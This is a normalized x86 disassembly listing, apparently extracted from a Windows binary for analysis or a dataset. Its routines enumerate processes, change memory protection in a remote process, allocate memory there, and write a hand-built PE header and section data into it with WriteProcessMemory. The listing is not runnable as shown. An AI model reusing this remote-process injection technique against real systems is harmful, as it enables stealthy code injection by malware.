add esp 0x1c
mov [ ebp - 0x74 ] ax
lea eax [ ebp - 0x90 ]
push 0x0
push 0x40
push eax
push esi
push ebx
call edi
test eax eax
je r-xdata
push 0x0
lea eax [ ebp - 0x3c ]
push 0x14
push eax
push ebx
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x134 ]
push esi
push ebx
call [ VirtualProtectEx@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x10 ]
push 0x14
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call [ VirtualProtectEx@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x188 ]
push eax
push esi
push ebx
call sub_4024dc
add esp 0xc
cmp [ ebp - 0x20 ] ax
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x2d8 ]
push 0x150
push eax
push r--data
push ebx
call sub_4026c7
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x40
push [ ebp - 0x134 ]
push esi
push ebx
call [ VirtualProtectEx@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x28 ] 0x1
sub_402493
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
push 0x57
pop eax
pop ebp
retn
cmp [ ebp + 0xc ] 0x0
pop esi
jne r-xdata
mov [ edx ] cl
inc edx
inc esi
dec [ ebp + 0xc ]
jne r-xdata
and [ edx ] 0x0
pop ebp
retn
push 0x57
dec edx
pop eax
mov cl [ esi ]
test cl cl
je r-xdata
sub_4024dc
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
xor edi edi
push 0x1c
lea eax [ ebp - 0x1c ]
push edi
push eax
call memset
mov ebx [ ebp + 0xc ]
mov esi [ VirtualQueryEx@IAT ]
add esp 0xc
lea eax [ ebp - 0x1c ]
push 0x1c
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetLastError@IAT ]
cmp [ ebp - 0x18 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push edi
call sub_402556
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
add ecx eax
push ecx
push eax
push [ ebp + 0x8 ]
push edi
call sub_402579
mov ecx [ ebp - 0x10 ]
mov edi eax
mov eax [ ebp - 0x1c ]
add esp 0x10
add eax ecx
lea ecx [ ebp - 0x1c ]
push 0x1c
push ecx
push eax
push [ ebp + 0x8 ]
jmp r-xdata
call esi
test eax eax
jbe r-xdata
sub_402556
push esi
mov esi [ esp + 0xc ]
mov ax [ esi + 0x58 ]
push eax
push [ esp + 0xc ]
call sub_4024c8
mov cx [ esi + 0x5a ]
push ecx
push eax
call sub_4024c8
add esp 0x10
pop esi
retn
sub_402579
push ebp
mov ebp esp
mov eax 0x1000
call sub_401bc0
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp edi [ ebp + 0x14 ]
jae r-xdata
mov ax [ ebp + 0x8 ]
pop edi
pop esi
leave
retn
mov esi 0x1000
lea eax [ ebp - 0x1000 ]
push esi
push eax
movzx eax [ ebp + 0x8 ]
push eax
call sub_4025d4
add edi esi
add esp 0xc
cmp edi [ ebp + 0x14 ]
mov [ ebp + 0x8 ] eax
jb r-xdata
push 0x0
lea eax [ ebp - 0x1000 ]
push esi
push eax
push edi
push [ ebp + 0xc ]
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
sub_4025d4
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
jbe r-xdata
push [ ebp + 0x8 ]
call sub_402610
pop ecx
pop ebp
retn
mov ecx [ ebp + 0xc ]
inc eax
push esi
shr eax 0x1
movzx edx [ ecx ]
add [ ebp + 0x8 ] edx
inc ecx
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
shr edx 0x10
and esi 0xffff
inc ecx
add edx esi
dec eax
mov [ ebp + 0x8 ] edx
jne r-xdata
pop esi
sub_40261c
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
push 0x1c
lea eax [ ebp - 0x1c ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x1c ]
mov ebx [ VirtualQueryEx@IAT ]
push 0x1c
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call ebx
test eax eax
jbe r-xdata
call [ GetLastError@IAT ]
xor eax eax
mov edi [ VirtualAllocEx@IAT ]
mov ecx [ ebp - 0x10 ]
push 0x1c
add eax ecx
lea ecx [ ebp - 0x1c ]
push ecx
push eax
push [ ebp + 0x8 ]
call ebx
test eax eax
ja r-xdata
lea esi [ eax + 0xffff ]
and si 0x0
cmp [ ebp - 0xc ] 0x10000
mov eax [ ebp - 0x1c ]
jne r-xdata
push 0x4
push 0x2000
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
add esi 0x10000
jmp r-xdata
push 0x4
push 0x1000
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call edi
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
add ecx eax
cmp esi ecx
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4026c7
push ebp
mov ebp esp
sub esp 0x1c4
mov eax [ ebp + 0x14 ]
push ebx
push esi
push edi
push 0x4
add eax 0x1b8
push 0x1000
xor ebx ebx
push eax
push ebx
push [ ebp + 0x8 ]
call [ VirtualAllocEx@IAT ]
mov esi eax
cmp esi ebx
mov [ ebp - 0xc ] esi
je r-xdata
xor eax eax
push 0x40
lea eax [ ebp - 0xcc ]
pop edi
mov [ ebp - 0x4 ] ebx
push edi
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x4 ]
mov ebx [ WriteProcessMemory@IAT ]
mov [ ebp - 0xcc ] 0x5a4d
push eax
lea eax [ ebp - 0xcc ]
push edi
push eax
push esi
mov [ ebp - 0x90 ] edi
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] edi
jne r-xdata
add esi edi
lea eax [ ebp - 0x1c4 ]
mov [ ebp - 0x8 ] esi
mov esi 0xf8
push esi
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x1c4 ] 0x4550
mov [ ebp - 0x1b0 ] 0xe0
push eax
lea eax [ ebp - 0x1c4 ]
push esi
push eax
push [ ebp - 0x8 ]
mov [ ebp - 0x1ae ] 0x2000
mov [ ebp - 0x1be ] 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
add [ ebp - 0x8 ] esi
push 0x28
lea eax [ ebp - 0x4c ]
push 0x0
push eax
call memset
push 0x8
lea eax [ ebp - 0x4c ]
push rw-data
push eax
call memcpy
mov eax [ ebp - 0x8 ]
add esp 0x18
sub eax [ ebp - 0xc ]
add eax 0x28
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x14 ]
lea esi [ eax + 0x58 ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x4c ]
push 0x28
push eax
push [ ebp - 0x8 ]
mov [ ebp - 0x3c ] esi
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x28
jne r-xdata
add [ ebp - 0x8 ] 0x28
push edi
lea eax [ ebp - 0x8c ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x88 ] 0x727444
push eax
lea eax [ ebp - 0x8c ]
push edi
push eax
push [ ebp - 0x8 ]
mov [ ebp - 0x84 ] edi
mov [ ebp - 0x80 ] esi
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] edi
jne r-xdata
add [ ebp - 0x8 ] edi
push 0x18
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call memset
mov eax [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
and [ ebp - 0x20 ] 0x0
add eax 0x18
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x24 ] eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0xc
lea eax [ ebp - 0x4 ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24 ]
push 0x18
push eax
push esi
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x18
jne r-xdata
mov edi [ ebp + 0x14 ]
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x10 ]
add esi 0x18
push esi
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] edi
jne r-xdata
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
sprintf
jmp [ sprintf@IAT ]
free
jmp [ free@IAT ]
fflush
jmp [ fflush@IAT ]
fwrite
jmp [ fwrite@IAT ]
malloc
jmp [ malloc@IAT ]
fclose
jmp [ fclose@IAT ]
_filelength
jmp [ _filelength@IAT ]
fopen
jmp [ fopen@IAT ]
_strnicmp
jmp [ _strnicmp@IAT ]
_sleep
jmp [ _sleep@IAT ]
exit
jmp [ exit@IAT ]
strrchr
jmp [ strrchr@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401d66
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401d78
xor eax eax
retn
sub_401d7b
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_402610
mov eax [ esp + 0x4 ]
shr eax 0x10
add eax [ esp + 0x4 ]
retn
GetModuleBaseNameA
jmp [ GetModuleBaseNameA@IAT ]
EnumProcessModules
jmp [ EnumProcessModules@IAT ]
EnumProcesses
jmp [ EnumProcesses@IAT ]
memset
jmp [ memset@IAT ]
memcpy
jmp [ memcpy@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
strlen
jmp [ strlen@IAT ]
